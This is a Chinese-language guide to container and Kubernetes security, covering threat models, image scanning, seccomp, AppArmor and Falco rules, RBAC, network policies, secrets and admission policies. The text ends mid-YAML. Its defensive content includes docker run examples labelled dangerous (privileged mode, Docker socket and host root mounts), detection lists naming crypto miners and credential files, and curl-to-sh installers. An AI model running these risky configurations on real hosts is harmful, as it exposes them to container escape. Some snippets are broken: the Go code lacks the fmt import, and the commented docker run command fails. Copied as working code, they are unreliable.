---
title: Container Security Complete Guide
description: Master container security best practices
track: security
section: infra-security
difficulty: advanced
tags:
  - Container Security
  - Docker Security
  - Kubernetes Security
  - Image Scanning
status: imported
origin: old/src/content/docs/security/container-security.zh.md
divergence: 0.217
issues:
  - title-lang-zh
  - title-language
legacy:
  category: Security
  subcategory: Container
  order: 7
  lastUpdated: 2026-01-07
---

容器技术已成为现代应用部署的标准。Docker 和 Kubernetes 的广泛采用使容器安全成为企业安全架构中不可或缺的一部分。虽然容器提供了隔离性和可移植性，但它们也引入了新的攻击面和安全挑战。本文系统地涵盖了容器安全的各个方面，从威胁建模到实际防护措施，帮助您构建安全的容器化应用。

## 容器威胁模型

### 容器技术中的安全边界

在深入了解容器安全之前，我们需要了解安全边界和潜在的攻击面：

```
+------------------------------------------------------------------+
|                    容器安全攻击面                                  |
+------------------------------------------------------------------+
|                                                                   |
|  +----------------+  +----------------+  +----------------+       |
|  |   镜像层       |  |   运行时层     |  |   编排层       |       |
|  +----------------+  +----------------+  +----------------+       |
|  | - 恶意基础     |  | - 容器逃逸     |  | - API 滥用     |       |
|  |   镜像         |  | - 权限提升     |  | - 配置错误     |       |
|  | - 存在漏洞的   |  | - 资源耗尽     |  | - 网络攻击     |       |
|  |   依赖项       |  | - 进程注入     |  | - RBAC 绕过    |       |
|  | - 密钥泄露     |  |                |  |                |       |
|  | - 供应链攻击   |  |                |  |                |       |
|  +----------------+  +----------------+  +----------------+       |
|                                                                   |
|  +----------------+  +----------------+  +----------------+       |
|  |   主机层       |  |   网络层       |  |   数据层       |       |
|  +----------------+  +----------------+  +----------------+       |
|  | - 内核漏洞     |  | - 容器间      |  | - 卷挂载暴露   |       |
|  |   利用         |  |   攻击         |  | - 密钥暴露     |       |
|  | - Docker       |  | - 中间人攻击   |  | - 日志泄露     |       |
|  |   守护进程     |  | - 端口暴露     |  |                |       |
|  | - 共享资源     |  |                |  |                |       |
|  +----------------+  +----------------+  +----------------+       |
|                                                                   |
+------------------------------------------------------------------+
```

### 常见威胁类型

#### 镜像相关威胁

```yaml
# 威胁示例：使用不受信任的基础镜像
# 危险示例
FROM random-user/ubuntu:latest  # 来源不明的镜像

# 安全示例
FROM ubuntu:22.04@sha256:abc123...  # 带有固定摘要的官方镜像
```

#### 容器逃逸威胁

容器逃逸是最严重的容器安全威胁之一。攻击者可能利用以下方法突破容器隔离：

```bash
# 危险配置 - 特权容器
docker run --privileged -it ubuntu bash

# 危险配置 - 挂载 Docker Socket
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu

# 危险配置 - 挂载主机根目录
docker run -v /:/host ubuntu
```

#### 供应链攻击

```
攻击链示例：
1. 攻击者入侵开源依赖仓库
2. 向流行的基础镜像注入恶意代码
3. 开发者在构建过程中拉取被污染的镜像
4. 恶意代码在生产环境中执行
5. 数据泄露或系统被入侵
```

### 攻击向量深度分析

了解攻击向量有助于构建适当的防御：

```
+------------------------------------------------------------------+
|                    容器攻击向量                                    |
+------------------------------------------------------------------+
|                                                                   |
|  构建时攻击：                                                      |
|  - 恶意基础镜像                                                    |
|  - 被入侵的构建流水线                                              |
|  - 存在漏洞的依赖项                                                |
|  - Dockerfile 中硬编码的密钥                                       |
|                                                                   |
|  部署时攻击：                                                      |
|  - 不安全的镜像仓库通信                                            |
|  - 传输过程中的镜像篡改                                            |
|  - 编排层配置错误                                                  |
|                                                                   |
|  运行时攻击：                                                      |
|  - 通过内核漏洞的容器逃逸                                          |
|  - 资源耗尽（DoS）                                                 |
|  - 基于网络的攻击                                                  |
|  - 加密货币挖矿劫持                                                |
|                                                                   |
+------------------------------------------------------------------+
```

## 镜像安全

### 选择最小化基础镜像

使用最小化基础镜像可以显著减少攻击面：

```dockerfile
# 不推荐 - 完整的 Ubuntu 镜像（约 77MB）
FROM ubuntu:22.04

# 推荐 - Alpine 镜像（约 5MB）
FROM alpine:3.18

# 最佳 - Distroless 镜像（约 2MB）
FROM gcr.io/distroless/static-debian12

# 特定语言的最小化镜像
# Go 应用
FROM golang:1.21-alpine AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o main .

FROM gcr.io/distroless/static-debian12
COPY --from=builder /app/main /
CMD ["/main"]

# Node.js 应用
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM gcr.io/distroless/nodejs20-debian12
COPY --from=builder /app/node_modules /app/node_modules
COPY . /app
CMD ["app/index.js"]

# Python 应用
FROM python:3.11-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM gcr.io/distroless/python3-debian12
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY . /app
WORKDIR /app
CMD ["main.py"]
```

### 镜像扫描实践

#### 使用 Trivy 进行漏洞扫描

```bash
# 安装 Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# 扫描本地镜像
trivy image myapp:latest

# 扫描并只显示 HIGH 和 CRITICAL 级别的漏洞
trivy image --severity HIGH,CRITICAL myapp:latest

# 生成 JSON 格式报告
trivy image --format json --output report.json myapp:latest

# 在 CI/CD 中使用 - 发现漏洞时失败
trivy image --exit-code 1 --severity CRITICAL myapp:latest

# 扫描文件系统中的 IaC 配置错误
trivy fs --security-checks vuln,config /path/to/project

# 扫描 Kubernetes 集群
trivy k8s --report summary cluster
```

#### 使用 Grype 进行漏洞检测

```bash
# 安装 Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# 扫描镜像
grype myapp:latest

# 以 JSON 格式输出
grype myapp:latest -o json > vulnerabilities.json

# 发现指定严重级别的漏洞时失败
grype myapp:latest --fail-on high
```

#### 集成到 CI/CD 流水线

```yaml
# GitHub Actions 示例
name: Container Security Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'

      - name: Fail on critical vulnerabilities
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          exit-code: '1'
          severity: 'CRITICAL'

      - name: Sign image with Cosign
        if: github.ref == 'refs/heads/main'
        run: |
          cosign sign --key cosign.key myapp:${{ github.sha }}
```

### 安全的 Dockerfile 实践

```dockerfile
# 安全的多阶段构建示例
# 阶段 1：构建
FROM golang:1.21-alpine AS builder

# 安装必要的构建工具
RUN apk add --no-cache git ca-certificates tzdata

# 创建非 root 用户
RUN adduser -D -g '' appuser

WORKDIR /build

# 利用缓存层 - 首先复制依赖文件
COPY go.mod go.sum ./
RUN go mod download

# 复制源代码
COPY . .

# 编译为静态二进制文件
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags='-w -s -extldflags "-static"' \
    -o /app/main ./cmd/server

# 阶段 2：运行时
FROM scratch

# 从构建阶段复制必要文件
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /etc/passwd /etc/passwd
COPY --from=builder /app/main /main

# 使用非 root 用户
USER appuser

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD ["/main", "health"]

# 运行应用
ENTRYPOINT ["/main"]
```

### 镜像签名与验证

```bash
# 生成 Cosign 密钥对
cosign generate-key-pair

# 签名镜像
cosign sign --key cosign.key myregistry/myapp:v1.0.0

# 验证镜像签名
cosign verify --key cosign.pub myregistry/myapp:v1.0.0

# 使用无密钥签名（使用 OIDC 身份）
COSIGN_EXPERIMENTAL=1 cosign sign myregistry/myapp:v1.0.0

# 验证无密钥签名
COSIGN_EXPERIMENTAL=1 cosign verify myregistry/myapp:v1.0.0
```

## 运行时安全

### 容器运行时安全配置

```bash
# 安全的 Docker run 命令
docker run \
    --name secure-app \
    --user 1000:1000 \                    # 非 root 用户
    --read-only \                          # 只读文件系统
    --tmpfs /tmp:rw,noexec,nosuid \       # 临时目录不可执行
    --cap-drop ALL \                       # 删除所有能力
    --cap-add NET_BIND_SERVICE \          # 仅添加必要的能力
    --security-opt no-new-privileges \    # 禁用权限提升
    --security-opt seccomp=default.json \ # Seccomp 配置文件
    --pids-limit 100 \                    # 限制进程数
    --memory 512m \                        # 内存限制
    --cpus 0.5 \                          # CPU 限制
    --network custom-bridge \              # 自定义网络
    --restart on-failure:3 \              # 重启策略
    myapp:latest
```

### Seccomp 配置文件配置

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_AARCH64"
  ],
  "syscalls": [
    {
      "names": [
        "accept",
        "accept4",
        "bind",
        "clone",
        "close",
        "connect",
        "epoll_create",
        "epoll_create1",
        "epoll_ctl",
        "epoll_wait",
        "epoll_pwait",
        "execve",
        "exit",
        "exit_group",
        "fcntl",
        "fstat",
        "futex",
        "getpeername",
        "getsockname",
        "getsockopt",
        "listen",
        "lseek",
        "mmap",
        "mprotect",
        "munmap",
        "nanosleep",
        "open",
        "openat",
        "poll",
        "read",
        "recvfrom",
        "recvmsg",
        "rt_sigaction",
        "rt_sigprocmask",
        "rt_sigreturn",
        "sendmsg",
        "sendto",
        "setsockopt",
        "shutdown",
        "socket",
        "stat",
        "write",
        "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### AppArmor 配置文件配置

```
# /etc/apparmor.d/docker-secure-app
#include <tunables/global>

profile docker-secure-app flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # 网络访问
  network inet tcp,
  network inet udp,
  network inet icmp,

  # 拒绝原始套接字
  deny network raw,
  deny network packet,

  # 文件系统访问
  /app/** r,
  /tmp/** rw,

  # 拒绝敏感路径
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /proc/*/mem rw,
  deny /sys/** w,

  # 拒绝挂载操作
  deny mount,
  deny umount,

  # 拒绝 ptrace
  deny ptrace,

  # 能力限制
  capability net_bind_service,
  deny capability sys_admin,
  deny capability sys_ptrace,
}
```

### 使用 Falco 进行运行时检测

```yaml
# Falco 运行时安全监控自定义规则
- rule: Container Shell Spawned
  desc: 检测容器中生成的交互式 shell
  condition: >
    spawned_process
    and container
    and shell_procs
    and proc.tty != 0
  output: >
    在容器中检测到交互式 shell（user=%user.name container=%container.name
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty）
  priority: WARNING
  tags: [container, shell, mitre_execution]

- rule: Sensitive File Access in Container
  desc: 检测容器访问主机敏感文件
  condition: >
    open_read
    and container
    and sensitive_files
  output: >
    容器正在访问敏感文件（user=%user.name command=%proc.cmdline
    file=%fd.name container=%container.name image=%container.image.repository）
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access]

- rule: Cryptocurrency Mining Detected
  desc: 检测潜在的加密货币挖矿活动
  condition: >
    spawned_process
    and container
    and (
      proc.name in (crypto_miner_names)
      or proc.cmdline contains "stratum+tcp"
      or proc.cmdline contains "mining.pool"
    )
  output: >
    检测到潜在的加密货币挖矿（user=%user.name command=%proc.cmdline
    container=%container.name image=%container.image.repository）
  priority: CRITICAL
  tags: [container, cryptomining, mitre_execution]

- rule: Container Drift Detected
  desc: 检测运行中容器中的新可执行文件
  condition: >
    spawned_process
    and container
    and not proc.exe in (container.image.processes)
  output: >
    在容器中检测到新的可执行文件（proc=%proc.name exe=%proc.exe
    container=%container.name image=%container.image.repository）
  priority: WARNING
  tags: [container, drift]

- list: crypto_miner_names
  items: [xmrig, minerd, cpuminer, stratum, cgminer, bfgminer]

- list: sensitive_files
  items: [/etc/shadow, /etc/sudoers, /etc/kubernetes, /var/run/secrets]
```

## 权限控制

### 以非 Root 用户运行

```dockerfile
# 方法 1：在 Dockerfile 中创建用户
FROM alpine:3.18

# 创建应用目录
RUN mkdir -p /app && chown -R nobody:nobody /app

# 安装应用
COPY --chown=nobody:nobody app /app/

# 切换到非 root 用户
USER nobody

WORKDIR /app
CMD ["./app"]

# 方法 2：使用特定的 UID/GID
FROM ubuntu:22.04

# 创建具有特定 UID/GID 的用户
RUN groupadd -g 10001 appgroup && \
    useradd -u 10001 -g appgroup -s /sbin/nologin -M appuser

# 设置文件权限
COPY --chown=appuser:appgroup . /app

USER 10001:10001

CMD ["/app/main"]
```

### Linux 能力管理

```bash
# 查看容器能力
docker run --rm alpine capsh --print

# 删除所有能力并仅添加必要的能力
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx

# 常见能力说明：
# NET_BIND_SERVICE - 绑定 1024 以下端口
# CHOWN - 更改文件所有权
# DAC_OVERRIDE - 绕过文件权限检查
# SETUID/SETGID - 更改进程 UID/GID
# SYS_ADMIN - 系统管理（危险！）
# NET_RAW - 使用原始套接字
# SYS_PTRACE - 跟踪进程
```

```yaml
# 带有安全上下文的 Kubernetes Pod 配置
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
          add:
            - NET_BIND_SERVICE
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /app/cache
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"
  volumes:
    - name: tmp
      emptyDir: {}
    - name: cache
      emptyDir: {}
```

### 用户命名空间映射

```bash
# 在 Docker 守护进程中启用用户命名空间重映射
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}

# 或指定自定义用户
{
  "userns-remap": "dockremap:dockremap"
}

# 创建从属 UID/GID 映射
echo "dockremap:100000:65536" >> /etc/subuid
echo "dockremap:100000:65536" >> /etc/subgid

# 重启 Docker 守护进程
systemctl restart docker
```

## 网络隔离

### Docker 网络安全

```bash
# 创建隔离的用户定义网络
docker network create --driver bridge \
    --subnet 172.20.0.0/16 \
    --ip-range 172.20.240.0/20 \
    secure-network

# 创建内部网络（无外部访问）
docker network create --driver bridge \
    --internal \
    internal-network

# 在隔离网络中运行容器
docker run -d --name db --network internal-network postgres
docker run -d --name app --network secure-network myapp
docker network connect internal-network app  # app 可以访问 db

# 禁用容器间通信
docker network create --driver bridge \
    --opt com.docker.network.bridge.enable_icc=false \
    isolated-network
```

### Kubernetes 网络策略

```yaml
# 默认拒绝所有入站流量
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress

---
# 默认拒绝所有出站流量
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress

---
# 允许特定的服务间通信
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api-server
        - namespaceSelector:
            matchLabels:
              name: production
      ports:
        - protocol: TCP
          port: 5432

---
# 允许出站到特定服务和 DNS
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api-server
  policyTypes:
    - Egress
  egress:
    # 允许访问数据库
    - to:
        - podSelector:
            matchLabels:
              app: database
      ports:
        - protocol: TCP
          port: 5432
    # 允许 DNS 查询
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
    # 允许外部 HTTPS
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
      ports:
        - protocol: TCP
          port: 443
```

### 使用 Istio 的服务网格安全

```yaml
# Istio PeerAuthentication - 强制 mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT

---
# Istio AuthorizationPolicy - 细粒度访问控制
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: api-server-policy
  namespace: production
spec:
  selector:
    matchLabels:
      app: api-server
  action: ALLOW
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/production/sa/frontend"]
      to:
        - operation:
            methods: ["GET", "POST"]
            paths: ["/api/*"]
    - from:
        - source:
            principals: ["cluster.local/ns/production/sa/admin"]
      to:
        - operation:
            methods: ["*"]
```

## 密钥管理

### Kubernetes Secrets 安全实践

```yaml
# 不推荐：明文 Secret
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YWRtaW4=  # base64 编码，不是加密
  password: cGFzc3dvcmQ=

---
# 推荐：使用外部密钥管理
# 使用 External Secrets Operator
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: db-credentials
    creationPolicy: Owner
  data:
    - secretKey: username
      remoteRef:
        key: production/database
        property: username
    - secretKey: password
      remoteRef:
        key: production/database
        property: password
```

### 使用 HashiCorp Vault

```yaml
# Vault Agent Injector 配置
apiVersion: v1
kind: Pod
metadata:
  name: app-with-vault
  annotations:
    vault.hashicorp.com/agent-inject: 'true'
    vault.hashicorp.com/role: 'app-role'
    vault.hashicorp.com/agent-inject-secret-db-creds: 'secret/data/db/credentials'
    vault.hashicorp.com/agent-inject-template-db-creds: |
      {{- with secret "secret/data/db/credentials" -}}
      export DB_USER="{{ .Data.data.username }}"
      export DB_PASS="{{ .Data.data.password }}"
      {{- end -}}
spec:
  serviceAccountName: app-service-account
  containers:
    - name: app
      image: myapp:latest
      command: ['/bin/sh', '-c']
      args:
        - source /vault/secrets/db-creds && ./start.sh
```

### 应用层密钥处理

```go
// Go 应用安全密钥处理
package main

import (
    "context"
    "log"
    "os"
    "sync"
    "time"

    vault "github.com/hashicorp/vault/api"
    auth "github.com/hashicorp/vault/api/auth/kubernetes"
)

type SecretManager struct {
    client *vault.Client
    cache  map[string]*CachedSecret
    mutex  sync.RWMutex
}

type CachedSecret struct {
    Value     string
    ExpiresAt time.Time
}

func NewSecretManager() (*SecretManager, error) {
    config := vault.DefaultConfig()
    client, err := vault.NewClient(config)
    if err != nil {
        return nil, err
    }

    // 使用 Kubernetes 认证
    k8sAuth, err := auth.NewKubernetesAuth(
        "app-role",
        auth.WithServiceAccountTokenPath("/var/run/secrets/kubernetes.io/serviceaccount/token"),
    )
    if err != nil {
        return nil, err
    }

    authInfo, err := client.Auth().Login(context.Background(), k8sAuth)
    if err != nil {
        return nil, err
    }

    if authInfo == nil {
        return nil, fmt.Errorf("no auth info was returned")
    }

    return &SecretManager{
        client: client,
        cache:  make(map[string]*CachedSecret),
    }, nil
}

func (sm *SecretManager) GetSecret(path, key string) (string, error) {
    cacheKey := path + "/" + key

    // 使用读锁检查缓存
    sm.mutex.RLock()
    if cached, ok := sm.cache[cacheKey]; ok {
        if time.Now().Before(cached.ExpiresAt) {
            sm.mutex.RUnlock()
            return cached.Value, nil
        }
    }
    sm.mutex.RUnlock()

    // 从 Vault 获取
    secret, err := sm.client.Logical().Read(path)
    if err != nil {
        return "", err
    }

    if secret == nil || secret.Data == nil {
        return "", fmt.Errorf("secret not found: %s", path)
    }

    data, ok := secret.Data["data"].(map[string]interface{})
    if !ok {
        return "", fmt.Errorf("invalid secret format")
    }

    value, ok := data[key].(string)
    if !ok {
        return "", fmt.Errorf("key not found: %s", key)
    }

    // 使用写锁更新缓存
    sm.mutex.Lock()
    sm.cache[cacheKey] = &CachedSecret{
        Value:     value,
        ExpiresAt: time.Now().Add(5 * time.Minute),
    }
    sm.mutex.Unlock()

    return value, nil
}

// Cleanup - 退出时清除内存中的密钥
func (sm *SecretManager) Cleanup() {
    sm.mutex.Lock()
    defer sm.mutex.Unlock()

    for key := range sm.cache {
        // 删除前用零覆盖
        sm.cache[key].Value = ""
        delete(sm.cache, key)
    }
}
```

### 静态密钥加密

```yaml
# Kubernetes EncryptionConfiguration
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-32-byte-key>
      - identity: {}

---
# 或使用 KMS 提供程序进行云托管密钥
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - kms:
          name: aws-encryption-provider
          endpoint: unix:///var/run/kmsplugin/socket.sock
          cachesize: 1000
          timeout: 3s
      - identity: {}
```

## Kubernetes 安全

### RBAC 配置

```yaml
# 最小权限 ServiceAccount 配置
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-service-account
  namespace: production
automountServiceAccountToken: false  # 默认不挂载令牌

---
# 只读 ConfigMap 权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["app-config"]  # 限制到特定资源
    verbs: ["get", "watch"]
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["app-secrets"]
    verbs: ["get"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-role-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: app-service-account
    namespace: production
roleRef:
  kind: Role
  name: app-role
  apiGroup: rbac.authorization.k8s.io

---
# 应用 Pod 配置
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  serviceAccountName: app-service-account
  automountServiceAccountToken: true  # 仅在需要时挂载
  containers:
    - name: app
      image: myapp:latest
```

### API Server 安全加固

```yaml
# /etc/kubernetes/manifests/kube-apiserver.yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
    - name: kube-apiserver
      command:
        - kube-apiserver
        # 认证配置
        - --anonymous-auth=false
        - --authentication-token-webhook-config-file=/etc/kubernetes/webhook-config.yaml

        # 授权配置
        - --authorization-mode=RBAC,Node

        # 审计日志
        - --audit-log-path=/var/log/kubernetes/audit.log
        - --audit-log-maxage=30
        - --audit-log-maxbackup=10
        - --audit-log-maxsize=100
        - --audit-policy-file=/etc/kubernetes/audit-policy.yaml

        # TLS 配置
        - --tls-min-version=VersionTLS12
        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384

        # 其他安全配置
        - --enable-admission-plugins=NodeRestriction,PodSecurity
        - --profiling=false
        - --enable-bootstrap-token-auth=true
```

### 审计策略配置

```yaml
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # 不记录这些请求
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
      - group: ""
        resources: ["endpoints", "services", "services/status"]

  # 记录认证失败
  - level: Metadata
    omitStages:
      - RequestReceived
    resources:
      - group: "authentication.k8s.io"
        resources: ["tokenreviews"]

  # 详细记录 secrets 操作
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["secrets"]

  # 记录所有其他请求的元数据
  - level: Metadata
    omitStages:
      - RequestReceived
```

### 准入控制器

```yaml
# 用于自定义验证的 ValidatingWebhookConfiguration
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: security-policy-webhook
webhooks:
  - name: security.webhook.example.com
    clientConfig:
      service:
        name: security-webhook
        namespace: security-system
        path: "/validate"
      caBundle: <base64-encoded-ca-cert>
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Fail
    namespaceSelector:
      matchLabels:
        security-policy: enabled
```

## Pod 安全策略

### Pod 安全标准 (PSS)

从 Kubernetes 1.25 开始，PodSecurityPolicy 已弃用，由 Pod 安全标准取代：

```yaml
# 在命名空间级别强制执行安全策略
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    # 强制执行受限策略
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    # 审计基线违规
    pod-security.kubernetes.io/audit: baseline
    pod-security.kubernetes.io/audit-version: latest
    # 基线违规时发出警告
    pod-security.kubernetes.io/warn: baseline
    pod-security.kubernetes.io/warn-version: latest
```

### 符合受限策略的 Pod 配置

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: restricted-pod
  namespace: production
spec:
  # Pod 级别安全上下文
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault

  containers:
    - name: app
      image: myapp:latest

      # 容器级别安全上下文
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
        # 如果需要绑定低端口
        # capabilities:
        #   add:
        #     - NET_BIND_SERVICE

      # 资源限制
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"

      # 挂载点
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: config
          mountPath: /app/config
          readOnly: true

  volumes:
    - name: tmp
      emptyDir: {}
    - name: config
      configMap:
        name: app-config
```

### OPA Gatekeeper 策略示例

```yaml
# 安装 Gatekeeper 后，定义约束模板
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels

        violation[{"msg": msg, "details": {"missing_labels": missing}}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("资源缺少必需的标签：%v", [missing])
        }

---
# 应用约束
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces:
      - production
  parameters:
    labels:
      - "team"
      - "app"
      - "environment"

---
# 拒绝特权容器的约束模板
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenypriv
spec:
  crd:
    spec:
      names:
        kind: K8sDenyPrivileged
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdenypriv

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          container.securityContext.privileged == true
          msg := sprintf("容器 %v 不允许以特权模式运行", [container.name])
        }

        violation[{"msg": msg}] {
          container := input.review.object.spec.initContainers[_]
          container.securityContext.privileged == true
          msg := sprintf("初始化容器 %v 不允许以特权模式运行", [container.name])
        }

---
# 阻止主机命名空间的约束
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyhostnamespaces
spec:
  crd:
    spec:
      names:
        kind: K8sDenyHostNamespaces
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdenyhostnamespaces

        violation[{"msg": msg}] {
          input.review.object.spec.hostNetwork == true
          msg := "不允许使用 hostNetwork"
        }

        violation[{"msg": msg}] {
          input.review.object.spec.hostPID == true
          msg := "不允许使用 hostPID"
        }

        violation[{"msg": msg}] {
          input.review.object.spec.hostIPC == true
          msg := "不允许使用 hostIPC"
        }
```

### Kyverno 策略示例

```yaml
# Kyverno 策略要求非 root 容器
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-run-as-nonroot
spec:
  validationFailureAction: enforce
  background: true
  rules:
    - name: check-runasnonroot
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "不允许以 root 身份运行。请将 runAsNonRoot 设置为 true。"
        pattern:
          spec:
            securityContext:
              runAsNonRoot: true
            containers:
              - securityContext:
                  runAsNonRoot: true

---
# Kyverno 策略添加默认安全上下文
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: add-default-securitycontext
spec:
  rules:
    - name: add-securitycontext
      match:
        any:
          - resources:
              kinds:
                - Pod
      mutate:
        patchStrategicMerge:
          spec:
            securityContext:
              runAsNonRoot: true
              seccompProfile:
                type: RuntimeDefault
            containers:
              - (name): "*"
                securityContext:
                  allowPrivilegeEscalation: false
                  capabilities:
                    drop:
                      - ALL
```

## 安全监控

### Prometheus 监控配置

```yaml
# Prometheus 容器安全监控指标
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: container-security-rules
  namespace: monitoring
spec:
  groups:
    - name: container-security
      rules:
        # 特权容器告警
        - alert: PrivilegedContainerRunning
          expr: |
            kube_pod_container_info{container!=""}
            * on (pod, namespace)
